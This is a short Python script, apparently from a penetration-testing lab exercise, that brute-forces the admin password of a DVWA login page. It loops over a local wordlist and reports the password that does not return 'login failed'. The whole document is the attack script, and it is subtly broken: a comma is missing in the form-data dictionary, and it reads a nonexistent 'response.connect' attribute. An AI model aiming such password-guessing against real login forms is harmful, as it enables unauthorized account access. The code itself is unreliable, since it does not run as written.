import requests

target_url = "https://192.168.1.123/dvwa/login.php"
data_dictionary = {"username": "admin", "password": ""  "login": "submit"}


with open("/home/kali/Desktop/passwords.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dictionary["password"] = word
        response = requests.post(target_url, data=data_dictionary)
        if "login failed" not in response.connect.decode():
            print("[+] Found the password --> "+ word)
            exit()

print("[+] The Program is Done. ")
